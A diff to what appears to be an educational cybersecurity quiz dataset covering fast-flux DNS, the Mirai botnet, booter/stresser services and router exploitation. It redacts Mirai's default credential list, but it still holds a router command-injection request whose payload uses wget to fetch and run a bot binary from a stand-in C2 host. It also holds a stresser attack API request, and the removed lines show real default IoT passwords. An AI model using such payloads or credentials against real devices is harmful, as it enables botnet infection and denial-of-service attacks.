@@ -57,12 +57,12 @@ def generate_dga_domains(seed_date):
   {
     question: "What is 'Fast-Flux DNS', and how do Botnets use Rapid TTL Expirations to Hide C2 Servers?",
     shortAnswer: "Constantly changing the IP addresses associated with a single C2 domain name in DNS every few minutes with ultra-short TTLs (e.g. 60 seconds), routing traffic through an ever-shifting pool of compromised proxy bots.",
-    explanation: "In Single-Flux DNS, the `A` record for `c2.evil-botnet.in` points to 50 different infected residential IP addresses, changing every 60 seconds. In Double-Flux DNS, both the `A` records and the Authoritative Name Server (`NS`) records flux continuously. When security researchers try to trace or block the C2 IP, the domain is already pointing to 50 completely new IP addresses in another country.",
+    explanation: "In Single-Flux DNS, the `A` record for `attacker-c2.net` points to 50 different infected residential IP addresses, changing every 60 seconds. In Double-Flux DNS, both the `A` records and the Authoritative Name Server (`NS`) records flux continuously. When security researchers try to trace or block the C2 IP, the domain is already pointing to 50 completely new IP addresses in another country.",
     hint: "A criminal changing disguises and switching rental cars every 60 seconds to evade police tracking.",
     level: "expert",
     codeExample: `// Fast-Flux DNS Record Query (TTL = 60 Seconds):
-// Minute 01: c2.evil.in ➔ 185.220.101.5, 103.25.10.8, 198.51.100.4
-// Minute 02: c2.evil.in ➔ 45.33.32.156, 172.56.21.90, 82.102.23.4
+// Minute 01: attacker-c2.net ➔ 185.220.101.5, 103.25.10.8, 198.51.100.4
+// Minute 02: attacker-c2.net ➔ 45.33.32.156, 172.56.21.90, 82.102.23.4
 // Result: Static firewall IP blocking is completely rendered useless!`
   },
   {
@@ -87,15 +87,18 @@ def generate_dga_domains(seed_date):
 // Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
   },
   {
-    question: "What was the 'Mirai Botnet' (2016), and how did it weaponize Default IoT Passwords to Generate 1+ Tbps DDoS Floods?",
-    shortAnswer: "Mirai scanned the IPv4 internet on Telnet ports 23/2323, brute-forcing 62 hardcoded factory default username/password pairs on IoT devices (cameras, DVRs) to assemble a 400,000-node botnet generating historic 1+ Tbps floods.",
-    explanation: "In October 2016, Mirai exploited millions of unpatched IoT devices. Because consumer security cameras and DVRs were shipped with default credentials (`admin:admin`, `root:xc3511`), Mirai compromised over 400,000 devices in days. The botnet launched massive 1.2 Tbps DDoS floods against DNS provider Dyn, taking down major internet services (Twitter, Netflix, GitHub) across North America and Europe.",
-    hint: "Using a master key with 62 factory default combinations to unlock 400,000 smart cameras across the world.",
+    question: "What was the 'Mirai Botnet' (2016), and how did it exploit weaknesses in IoT security to generate large-scale DDoS attacks?",
+    shortAnswer: "Mirai targeted vulnerable IoT devices protected by weak or default credentials and enrolled compromised devices into a large botnet that could be coordinated for DDoS activity.",
+    explanation: "In October 2016, Mirai compromised large numbers of vulnerable IoT devices such as security cameras and DVRs. Devices with weak or default security configurations were particularly exposed. Compromised devices were enrolled into the botnet and later coordinated to participate in major DDoS attacks, including the attack against DNS provider Dyn. Specific credentials, scanning methods, and attack-launch procedures are omitted.",
+    hint: "Think of many poorly secured smart devices being recruited into one remotely coordinated network.",
     level: "moderate",
-    codeExample: `// Mirai Default Credential Table (C Source Code Snippet):
-char *usernames[] = {"root", "admin", "user", "guest"};
-char *passwords[] = {"xc3511", "vizxv", "admin", "123456", "default", "password"};
-// Mirai scanned Telnet port 23, tried all 62 pairs ➔ Infected 400,000 IoT devices in 48 hours!`
+    codeExample: `// Mirai Botnet — Safe Conceptual Flow:
+      1. Identify vulnerable IoT devices
+      2. Detect weak or default security configurations
+      3. Compromise vulnerable devices
+      4. Enroll compromised devices into a botnet
+      5. Coordinate defensive analysis and simulation
+      // Credential lists, scanning logic, and attack procedures are omitted.`
   },
   {
     question: "What is 'Anycast BGP Routing', and how does it Distribute Volumetric DDoS Traffic across Global Scrubbing Centers?",
@@ -156,7 +159,7 @@ flow-route {
     hint: "Renting a massive wrecking ball with a credit card to smash a building with one click.",
     level: "basic",
     codeExample: `// Booter / Stresser API Attack Request:
-POST https://stresser-c2.evil-hub.in/api/v1/attack
+POST https://stresser-attacker-c2.net/api/v1/attack
 {
     "target": "103.25.10.50",
     "port": 443,
@@ -233,7 +236,7 @@ POST /setup.cgi?next_file=netcore_get.ccp HTTP/1.1
 Host: 103.25.10.50
 Content-Type: application/x-www-form-urlencoded
 
-cmd=wget http://c2.evil-botnet.in/bot.arm -O /tmp/b && chmod +x /tmp/b && /tmp/b
+cmd=wget http://attacker-c2.net/bot.arm -O /tmp/b && chmod +x /tmp/b && /tmp/b
 # Result: Router infected and converted into active botnet zombie in 2 seconds!`
   },
   {
